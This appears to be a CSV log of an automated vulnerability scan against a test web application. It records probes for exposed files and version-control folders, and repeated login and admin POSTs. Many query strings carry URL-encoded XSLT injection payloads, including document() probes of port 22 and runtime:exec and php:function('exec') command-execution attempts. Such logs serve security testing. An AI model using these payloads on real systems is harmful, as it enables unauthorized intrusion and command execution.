ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
5535,Mon Sep 07 03:12:31 BDT 2026,Mon Sep 07 03:12:32 BDT 2026,GET,https://tfctest-002-production.up.railway.app/vb_test.php,404,Not Found,541,436,1090
5536,Mon Sep 07 03:12:32 BDT 2026,Mon Sep 07 03:12:32 BDT 2026,GET,https://tfctest-002-production.up.railway.app/CHANGELOG.txt,404,Not Found,518,436,1090
5537,Mon Sep 07 03:12:32 BDT 2026,Mon Sep 07 03:12:33 BDT 2026,GET,https://tfctest-002-production.up.railway.app/sites/default/files/.ht.sqlite,404,Not Found,533,436,1090
5538,Mon Sep 07 03:12:33 BDT 2026,Mon Sep 07 03:12:33 BDT 2026,GET,https://tfctest-002-production.up.railway.app/composer.json,404,Not Found,548,436,1090
5539,Mon Sep 07 03:12:33 BDT 2026,Mon Sep 07 03:12:34 BDT 2026,GET,https://tfctest-002-production.up.railway.app/composer.lock,404,Not Found,536,436,1090
5540,Mon Sep 07 03:12:34 BDT 2026,Mon Sep 07 03:12:34 BDT 2026,GET,https://tfctest-002-production.up.railway.app/vim_settings.xml,404,Not Found,513,436,1090
5541,Mon Sep 07 03:12:34 BDT 2026,Mon Sep 07 03:12:35 BDT 2026,GET,https://tfctest-002-production.up.railway.app/server-info,404,Not Found,520,436,1090
5542,Mon Sep 07 03:12:35 BDT 2026,Mon Sep 07 03:12:35 BDT 2026,GET,https://tfctest-002-production.up.railway.app/phpinfo.php,404,Not Found,517,436,1090
5543,Mon Sep 07 03:12:35 BDT 2026,Mon Sep 07 03:12:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/info.php,404,Not Found,530,436,1090
5544,Mon Sep 07 03:12:36 BDT 2026,Mon Sep 07 03:12:36 BDT 2026,GET,https://tfctest-002-production.up.railway.app/i.php,404,Not Found,497,436,1090
5545,Mon Sep 07 03:12:36 BDT 2026,Mon Sep 07 03:12:37 BDT 2026,GET,https://tfctest-002-production.up.railway.app/test.php,404,Not Found,517,436,1090
5546,Mon Sep 07 03:12:37 BDT 2026,Mon Sep 07 03:12:37 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_wpeprivate/config.json,404,Not Found,534,436,1090
5547,Mon Sep 07 03:12:37 BDT 2026,Mon Sep 07 03:12:38 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_framework/blazor.boot.json,404,Not Found,533,436,1090
5548,Mon Sep 07 03:12:38 BDT 2026,Mon Sep 07 03:12:38 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.hg,404,Not Found,516,436,1090
5549,Mon Sep 07 03:12:38 BDT 2026,Mon Sep 07 03:12:39 BDT 2026,GET,https://tfctest-002-production.up.railway.app/.bzr,404,Not Found,549,436,1090
5550,Mon Sep 07 03:12:39 BDT 2026,Mon Sep 07 03:12:39 BDT 2026,GET,https://tfctest-002-production.up.railway.app/._darcs,404,Not Found,506,436,1090
5551,Mon Sep 07 03:12:39 BDT 2026,Mon Sep 07 03:12:40 BDT 2026,GET,https://tfctest-002-production.up.railway.app/BitKeeper,404,Not Found,977,436,1090
5552,Mon Sep 07 03:12:40 BDT 2026,Mon Sep 07 03:12:41 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,556,437,93
5553,Mon Sep 07 03:12:40 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,GET,https://tfctest-002-production.up.railway.app,200,OK,1033,534,49517
5554,Mon Sep 07 03:12:40 BDT 2026,Mon Sep 07 03:12:41 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%3C,200,OK,509,428,979
5555,Mon Sep 07 03:12:41 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,505,437,93
5556,Mon Sep 07 03:12:41 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,1171,437,93
5557,Mon Sep 07 03:12:40 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,1211,437,93
5558,Mon Sep 07 03:12:40 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,1211,437,93
5559,Mon Sep 07 03:12:40 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,1211,437,93
5560,Mon Sep 07 03:12:41 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,1381,437,93
5561,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next,404,Not Found,499,361,9
5562,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,531,437,92
5563,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static,404,Not Found,497,361,9
5564,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,889,437,93
5565,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:42 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,516,428,979
5566,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,877,437,93
5567,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,891,437,93
5568,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,517,437,93
5569,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,917,437,93
5570,Mon Sep 07 03:12:42 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,1078,437,93
5571,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,GET,https://tfctest-002-production.up.railway.app/_next/static/chunks,404,Not Found,504,361,9
5572,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,538,437,93
5573,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,894,437,92
5574,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:44 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,886,437,92
5575,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:43 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,532,428,979
5576,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:44 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,881,437,92
5577,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:44 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,896,437,92
5578,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:44 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,509,437,93
5579,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:44 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,1156,437,92
5580,Mon Sep 07 03:12:44 BDT 2026,Mon Sep 07 03:12:44 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,517,437,93
5581,Mon Sep 07 03:12:43 BDT 2026,Mon Sep 07 03:12:44 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,864,437,93
5582,Mon Sep 07 03:12:44 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,886,437,93
5583,Mon Sep 07 03:12:44 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,876,437,93
5584,Mon Sep 07 03:12:44 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,822,437,93
5585,Mon Sep 07 03:12:44 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,1081,437,93
5586,Mon Sep 07 03:12:44 BDT 2026,Mon Sep 07 03:12:44 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,511,428,979
5587,Mon Sep 07 03:12:44 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,POST,https://tfctest-002-production.up.railway.app/login,500,Internal Server Error,539,437,93
5588,Mon Sep 07 03:12:44 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,878,437,93
5589,Mon Sep 07 03:12:45 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,795,437,93
5590,Mon Sep 07 03:12:45 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,879,437,93
5591,Mon Sep 07 03:12:45 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,865,437,93
5592,Mon Sep 07 03:12:45 BDT 2026,Mon Sep 07 03:12:46 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,891,437,93
5593,Mon Sep 07 03:12:45 BDT 2026,Mon Sep 07 03:12:45 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,534,428,979
5594,Mon Sep 07 03:12:45 BDT 2026,Mon Sep 07 03:12:46 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,888,437,93
5595,Mon Sep 07 03:12:45 BDT 2026,Mon Sep 07 03:12:46 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,895,437,93
5596,Mon Sep 07 03:12:45 BDT 2026,Mon Sep 07 03:12:46 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,868,437,93
5597,Mon Sep 07 03:12:46 BDT 2026,Mon Sep 07 03:12:46 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,895,437,93
5598,Mon Sep 07 03:12:46 BDT 2026,Mon Sep 07 03:12:46 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,947,437,93
5599,Mon Sep 07 03:12:46 BDT 2026,Mon Sep 07 03:12:46 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,528,428,979
5600,Mon Sep 07 03:12:46 BDT 2026,Mon Sep 07 03:12:46 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%3C,200,OK,709,429,1036
5601,Mon Sep 07 03:12:46 BDT 2026,Mon Sep 07 03:12:47 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,857,437,93
5602,Mon Sep 07 03:12:45 BDT 2026,Mon Sep 07 03:12:46 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=%3C,200,OK,828,429,1033
5603,Mon Sep 07 03:12:46 BDT 2026,Mon Sep 07 03:12:47 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,830,437,93
5604,Mon Sep 07 03:12:46 BDT 2026,Mon Sep 07 03:12:47 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,862,437,93
5605,Mon Sep 07 03:12:46 BDT 2026,Mon Sep 07 03:12:47 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,857,437,93
5606,Mon Sep 07 03:12:46 BDT 2026,Mon Sep 07 03:12:47 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,823,437,93
5607,Mon Sep 07 03:12:47 BDT 2026,Mon Sep 07 03:12:48 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,833,437,93
5608,Mon Sep 07 03:12:47 BDT 2026,Mon Sep 07 03:12:47 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,531,428,979
5609,Mon Sep 07 03:12:47 BDT 2026,Mon Sep 07 03:12:48 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,866,437,93
5610,Mon Sep 07 03:12:47 BDT 2026,Mon Sep 07 03:12:48 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,880,437,93
5611,Mon Sep 07 03:12:47 BDT 2026,Mon Sep 07 03:12:48 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,865,437,93
5612,Mon Sep 07 03:12:47 BDT 2026,Mon Sep 07 03:12:48 BDT 2026,POST,https://tfctest-002-production.up.railway.app/admin,500,Internal Server Error,842,437,93
5613,Mon Sep 07 03:12:47 BDT 2026,Mon Sep 07 03:12:48 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,662,429,1036
5614,Mon Sep 07 03:12:48 BDT 2026,Mon Sep 07 03:12:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3C&_rsc=5CB68i4pnAekjehf,200,OK,506,428,274
5615,Mon Sep 07 03:12:48 BDT 2026,Mon Sep 07 03:12:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products,404,Not Found,521,435,271
5616,Mon Sep 07 03:12:47 BDT 2026,Mon Sep 07 03:12:48 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,839,429,1033
5617,Mon Sep 07 03:12:48 BDT 2026,Mon Sep 07 03:12:48 BDT 2026,GET,https://tfctest-002-production.up.railway.app/?_rsc=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,541,428,979
5618,Mon Sep 07 03:12:48 BDT 2026,Mon Sep 07 03:12:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%3C,200,OK,493,429,1033
5619,Mon Sep 07 03:12:49 BDT 2026,Mon Sep 07 03:12:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&_rsc=5CB68i4pnAekjehf,200,OK,545,428,343
5620,Mon Sep 07 03:12:48 BDT 2026,Mon Sep 07 03:12:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3C,200,OK,521,428,274
5621,Mon Sep 07 03:12:49 BDT 2026,Mon Sep 07 03:12:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=system-property%28%27xsl%3Avendor%27%29%2F%3E&_rsc=5CB68i4pnAekjehf,200,OK,519,428,308
5622,Mon Sep 07 03:12:49 BDT 2026,Mon Sep 07 03:12:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%3C,200,OK,546,429,1101
5623,Mon Sep 07 03:12:49 BDT 2026,Mon Sep 07 03:12:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%3C,200,OK,546,429,1100
5624,Mon Sep 07 03:12:48 BDT 2026,Mon Sep 07 03:12:49 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,669,429,1036
5625,Mon Sep 07 03:12:50 BDT 2026,Mon Sep 07 03:12:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&_rsc=5CB68i4pnAekjehf,200,OK,510,428,358
5626,Mon Sep 07 03:12:49 BDT 2026,Mon Sep 07 03:12:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,519,428,343
5627,Mon Sep 07 03:12:49 BDT 2026,Mon Sep 07 03:12:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,535,429,1033
5628,Mon Sep 07 03:12:49 BDT 2026,Mon Sep 07 03:12:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%3C,200,OK,488,429,1100
5629,Mon Sep 07 03:12:49 BDT 2026,Mon Sep 07 03:12:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,860,429,1033
5630,Mon Sep 07 03:12:50 BDT 2026,Mon Sep 07 03:12:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&_rsc=5CB68i4pnAekjehf,200,OK,537,428,349
5631,Mon Sep 07 03:12:50 BDT 2026,Mon Sep 07 03:12:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,498,429,1100
5632,Mon Sep 07 03:12:50 BDT 2026,Mon Sep 07 03:12:50 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,499,429,1101
5633,Mon Sep 07 03:12:50 BDT 2026,Mon Sep 07 03:12:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,661,429,1036
5634,Mon Sep 07 03:12:51 BDT 2026,Mon Sep 07 03:12:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E&_rsc=5CB68i4pnAekjehf,200,OK,542,428,379
5635,Mon Sep 07 03:12:50 BDT 2026,Mon Sep 07 03:12:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,533,429,1033
5636,Mon Sep 07 03:12:50 BDT 2026,Mon Sep 07 03:12:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,539,428,308
5637,Mon Sep 07 03:12:51 BDT 2026,Mon Sep 07 03:12:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,558,429,1100
5638,Mon Sep 07 03:12:51 BDT 2026,Mon Sep 07 03:12:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&_rsc=5CB68i4pnAekjehf,200,OK,529,428,624
5639,Mon Sep 07 03:12:51 BDT 2026,Mon Sep 07 03:12:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,533,429,1100
5640,Mon Sep 07 03:12:51 BDT 2026,Mon Sep 07 03:12:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,555,429,1101
5641,Mon Sep 07 03:12:51 BDT 2026,Mon Sep 07 03:12:51 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,941,429,1033
5642,Mon Sep 07 03:12:51 BDT 2026,Mon Sep 07 03:12:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,529,429,1033
5643,Mon Sep 07 03:12:52 BDT 2026,Mon Sep 07 03:12:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&_rsc=5CB68i4pnAekjehf,200,OK,539,428,373
5644,Mon Sep 07 03:12:51 BDT 2026,Mon Sep 07 03:12:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,529,428,358
5645,Mon Sep 07 03:12:51 BDT 2026,Mon Sep 07 03:12:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,670,429,1036
5646,Mon Sep 07 03:12:52 BDT 2026,Mon Sep 07 03:12:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,508,429,1100
5647,Mon Sep 07 03:12:52 BDT 2026,Mon Sep 07 03:12:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,490,429,1100
5648,Mon Sep 07 03:12:52 BDT 2026,Mon Sep 07 03:12:52 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,498,429,1101
5649,Mon Sep 07 03:12:52 BDT 2026,Mon Sep 07 03:12:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&_rsc=%3C,200,OK,474,428,282
5650,Mon Sep 07 03:12:52 BDT 2026,Mon Sep 07 03:12:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,534,429,1033
5651,Mon Sep 07 03:12:52 BDT 2026,Mon Sep 07 03:12:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,521,428,349
5652,Mon Sep 07 03:12:53 BDT 2026,Mon Sep 07 03:12:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/2?_rsc=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,571,429,1100
5653,Mon Sep 07 03:12:53 BDT 2026,Mon Sep 07 03:12:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/checkout?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,716,429,1036
5654,Mon Sep 07 03:12:53 BDT 2026,Mon Sep 07 03:12:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/1?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,524,429,1100
5655,Mon Sep 07 03:12:53 BDT 2026,Mon Sep 07 03:12:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/products/10?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,531,429,1101
5656,Mon Sep 07 03:12:52 BDT 2026,Mon Sep 07 03:12:53 BDT 2026,GET,https://tfctest-002-production.up.railway.app/admin?_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,902,429,1033
5657,Mon Sep 07 03:12:53 BDT 2026,Mon Sep 07 03:12:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%2Fcheckout&_rsc=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,532,428,282
5658,Mon Sep 07 03:12:53 BDT 2026,Mon Sep 07 03:12:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?_rsc=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,529,429,1033
5659,Mon Sep 07 03:12:54 BDT 2026,Mon Sep 07 03:12:54 BDT 2026,GET,https://tfctest-002-production.up.railway.app/login?next=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftfctest-002-production.up.railway.app%3A22%27%29%22%2F%3E,200,OK,497,428,379
